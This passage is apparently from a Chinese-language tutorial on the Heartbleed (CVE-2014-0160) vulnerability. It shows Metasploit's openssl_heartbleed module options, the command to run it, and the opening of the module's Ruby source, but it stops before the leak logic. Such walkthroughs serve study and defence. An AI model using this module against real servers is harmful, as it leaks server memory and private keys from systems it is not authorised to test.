port (TCP)</span><br><span class="line">  STATUS_EVERY      5                yes       How many retries until key dump status</span><br><span class="line">  THREADS           1                yes       The number of concurrent threads (max one per host)</span><br><span class="line">  TLS_CALLBACK      None             yes       Protocol to use, &quot;None&quot; to use raw TLS sockets (Accepted: None, SMTP, IMAP, JABBER, POP3, FTP, POSTGRES)</span><br><span class="line">  TLS_VERSION       1.0              yes       TLS/SSL version to use (Accepted: SSLv3, 1.0, 1.1, 1.2)</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module implements the OpenSSL Heartbleed attack. The problem</span><br><span class="line">  exists in the handling of heartbeat requests, where a fake length can</span><br><span class="line">  be used to leak memory data in the response. Services that support</span><br><span class="line">  STARTTLS may also be vulnerable.</span><br><span class="line"></span><br><span class="line">  The module supports several actions, allowing for scanning, dumping of</span><br><span class="line">  memory contents to loot, and private key recovery.</span><br><span class="line"></span><br><span class="line">  The LEAK_COUNT option can be used to specify leaks per SCAN or DUMP.</span><br><span class="line"></span><br><span class="line">  The repeat command can be used to make running the SCAN or DUMP many</span><br><span class="line">  times more powerful. As in:</span><br><span class="line">      repeat -t 60 run; sleep 2</span><br><span class="line">  To run every two seconds for one minute.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  https://nvd.nist.gov/vuln/detail/CVE-2014-0160</span><br><span class="line">  https://www.kb.cert.org/vuls/id/720951</span><br><span class="line">  https://www.cisa.gov/uscert/ncas/alerts/TA14-098A</span><br><span class="line">  https://heartbleed.com/</span><br><span class="line">  https://github.com/FiloSottile/Heartbleed</span><br><span class="line">  https://gist.github.com/takeshixx/10107280</span><br><span class="line">  https://filippo.io/Heartbleed/</span><br><span class="line"></span><br><span class="line">Also known as:</span><br><span class="line">  Heartbleed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info -d command</span><br></pre></td></tr></table></figure></div><p>设置 RHOSTS 和 RPORT 后还需要设置 verbose 为 true 才能看到泄露信息</p><div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/ssl/openssl_heartbleed) &gt; exploit</span><br></pre></td></tr></table></figure></div><p>执行 exp 获取敏感数据</p><h2 id="Exploit-分析"><a href="#Exploit-分析" class="headerlink" title="Exploit 分析"></a>Exploit 分析</h2><p>该模块的 exp 位于</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/modules/auxiliary/scanner/ssl/openssl_heartbleed.rb</span><br></pre></td></tr></table></figure></div><p>exp 的核心代码为</p><div class="code-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># This module requires Metasploit: https://metasploit.com/download</span></span><br><span class="line"><span class="comment"># Current source: https://github.com/rapid7/metasploit-framework</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> Connection reuse: Only connect once and send subsequent heartbleed requests.</span></span><br><span class="line"><span class="comment">#   We tried it once in https://github.com/rapid7/metasploit-framework/pull/3300</span></span><br><span class="line"><span class="comment">#   but there were too many errors</span></span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> Parse the rest of the server responses and return a hash with the data</span></span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> Extract the relevant functions and include them in the framework</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; <span class="title class_ inherited__">Msf::Auxiliary</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::Remote::Tcp</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Auxiliary::Scanner</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Auxiliary::Report</span></span><br><span class="line"></span><br><span class="line">  <span class="variable constant_">CIPHER_SUITES</span> = [</span><br><span class="line">    <span class="number">0xc014</span>, <span class="comment"># TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA</span></span><br><span class="line">    <span class="number">0xc00a</span>, <span class="comment"># TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA</span></span><br><span class="line">    <span class="number">0xc022</span>, <span class="comment"># TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA</span></span><br><span class="line">    <span class="number">0xc021</span>, <span class="comment"># TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA</span></span><br><span class="line">    <span class="number">0x0039</span>, <span class="comment"># TLS_DHE_RSA_WITH_AES_256_CBC_SHA</span></span><br><span class="line">    <span class="number">0x0038</span>, <span class="comment"># TLS_DHE_DSS_WITH_AES_256_CBC_SHA</span></span><br><span class="line">    <span class="number">0x0088</span>, <span class="comment"># TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA</span></span><br><span class="line">    <span class="number">0x0087</span>, <span class="comment"># TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA</span></span><br><span class="line">    <span class="number">0x0087</span>, <span class="comment"># TLS_ECDH_RSA_WITH_AES_256_CBC_SHA</span></span><br><span class="line">    <span class="number">0xc00f</span>, <span class="comment"># TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA</span></span><br><span class="line">    <span class="number">0x0035</span>, <span class="comment"># TLS_RSA_WITH_AES_256_CBC_SHA</span></span><br><span class="line">    <span class="number">0x0084</span>, <span class="comment"># TLS_RSA_WITH_CAMELLIA_256_CBC_SHA</span></span><br><span class="line">    <span class="number">0xc012</span>, <span class="comment"># TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA</span></span><br><span class="line">    <span class="number">0xc008</span>, <span class="comment"># TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA</span></span><br><span class="line">    <span class="number">0xc01c</span>, <span class="comment"># TLS_SRP_SHA_DSS_WITH_3DES_EDE_CBC_SHA</span></span><br><span class="line">    <span class="number">0xc01b</span>, <span class="comment"># TLS_SRP_SHA_RSA_WITH_3DES_EDE_CBC_SHA</span></span><br><span class="line">    <span class="number">0x0016</span>, <span class="comment"># TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA</span></span><br><span class="line">    <span class="number">0x0013</span>, <span class="comment"># TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA</span></span><br><span class="line">    <span class="number">0xc00d</span>, <span class="comment"># TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA</span></span><br><span class="line">    <span class="number">0xc003</span>, <span class="comment"># TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA</span></span><br><span class="line">    <span class="number">0x000a</span>, <span class="comment"># TLS_RSA_WITH_3DES_EDE_CBC_SHA</span></span><br><span class="line">    <span class="number">0xc013</span>, <span class="comment"># TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA</span></span><br><span class="line">    <span class="number">0xc009</span>, <span class="comment"># TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA</span></span><br><span class="line">    <span class="number">0xc01f</span>, <span class="comment"># TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA</span></span><br><span class="line">    <span class="number">0xc01e</span>, <span class="comment"># TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA</span></span><br><span class="line">    <span class="number">0x0033</span>, <span class="comment"># TLS_DHE_RSA_WITH_AES_128_CBC_SHA</span></span><br><span class="line">    <span class="number">0x0032</span>, <span class="comment"># TLS_DHE_DSS_WITH_AES_128_CBC_SHA</span></span><br><span class="line">    <span class="number">0x009a</span>, <span class="comment"># TLS_DHE_RSA_WITH_SEED_CBC_SHA</span></span><br><span class="line">    <span class="number">0x0099</span>, <span class="comment"># TLS_DHE_DSS_WITH_SEED_CBC_SHA</span></span><br><span class="line">    <span class="number">0x0045</span>, <span class="comment"># TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA</span></span><br><span class="line">    <span class="number">0x0044</span>, <span class="comment"># TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA</span></span><br><span class="line">    <span class="number">0xc00e</span>, <span class="comment"># TLS_ECDH_RSA_WITH_AES_128_CBC_SHA</span></span><br><span class="line">    <span class="number">0xc004</span>, <span class="comment"># TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA</span></span><br><span class="line">    <span class="number">0x002f</span>, <span class="comment"># TLS_RSA_WITH_AES_128_CBC_SHA</span></span><br><span class="line">    <span class="number">0x0096</span>, <span class="comment"># TLS_RSA_WITH_SEED_CBC_SHA</span></span><br><span class="line">    <span class="number">0x0041</span>, <span class="comment"># TLS_RSA_WITH_CAMELLIA_128_CBC_SHA</span></span><br><span class="line">    <span class="number">0xc011</span>, <span class="comment"># TLS_ECDHE_RSA_WITH_RC4_128_SHA</span></span><br><span class="line">    <span class="number">0xc007</span>, <span class="comment"># TLS_ECDHE_ECDSA_WITH_RC4_128_SHA</span></span><br><span class="line">    <span class="number">0xc00c</span>, <span class="comment"># TLS_ECDH_RSA_WITH_RC4_128_SHA</span></span><br><span class="line">    <span class="number">0xc002</span>, <span class="comment"># TLS_ECDH_ECDSA_WITH_RC4_128_SHA</span></span><br><span class="line">    <span class="number">0x0005</span>, <span class="comment"># TLS_RSA_WITH_RC4_128_SHA</span></span><br><span class="line">    <span class="number">0x0004</span>, <span class="comment"># TLS_RSA_WITH_RC4_128_MD5</span></span><br><span class="line">    <span class="number">0x0015</span>, <span class="comment"># TLS_DHE_RSA_WITH_DES_CBC_SHA</span></span><br><span class="line">    <span class="number">0x0012</span>, <span class="comment"># TLS_DHE_DSS_WITH_DES_CBC_SHA</span></span><br><span class="line">    <span class="number">0x0009</span>, <span class="comment"># TLS_RSA_WITH_DES_CBC_SHA</span></span><br><span class="line">    <span class="number">0x0014</span>, <span class="comment"># TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA</span></span><br><span class="line">    <span class="number">0x0011</span>, <span class="comment"># TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA</span></span><br><span class="line">    <span class="number">0x0008</span>, <span class="comment"># TLS_RSA_EXPORT_WITH_DES40_CBC_SHA</span></span><br><span class="line">    <span class="number">0x0006</span>, <span class="comment"># TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5</span></span><br><span class="line">    <span class="number">0x0003</span>, <span class="comment"># TLS_RSA_EXPORT_WITH_RC4_40_MD5</span></span><br><span class="line">    <span class="number">0x00ff</span>  <span class="comment"># Unknown</span></span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line">  <span class="variable constant_">SSL_RECORD_HEADER_SIZE</span>            = <span class="number">0x05</span></span><br><span class="line">  <span class="variable constant_">HANDSHAKE_RECORD_TYPE</span>             = <span class="number">0x16</span></span><br><span class="line">  <span class="variable constant_">HEARTBEAT_RECORD_TYPE</span>             = <span class="number">0x18</span></span><br><span class="line">  <span class="variable constant_">ALERT_RECORD_TYPE</span>                 = <span class="number">0x15</span></span><br><span class="line">  <span class="variable constant_">HANDSHAKE_SERVER_HELLO_TYPE</span>       = <span class="number">0x02</span></span><br><span class="line">  <span class="variable constant_">HANDSHAKE_CERTIFICATE_TYPE</span>        = <span class="number">0x0b</span></span><br><span class="line">  <span class="variable constant_">HANDSHAKE_KEY_EXCHANGE_TYPE</span>       = <span class="number">0x0c</span></span><br><span class="line">  <span class="variable constant_">HANDSHAKE_SERVER_HELLO_DONE_TYPE</span>  = <span class="number">0x0e</span></span><br><span class="line"></span><br><span class="line">  <span class="variable constant_">TLS_VERSION</span> = &#123;</span><br><span class="line">    <span class="string">&#x27;SSLv3&#x27;</span> =&gt; <span class="number">0x0300</span>,</span><br><span class="line">    <span class="string">&#x27;1.0&#x27;</span>   =&gt; <span class="number">0x0301</span>,</span><br><span class="line">  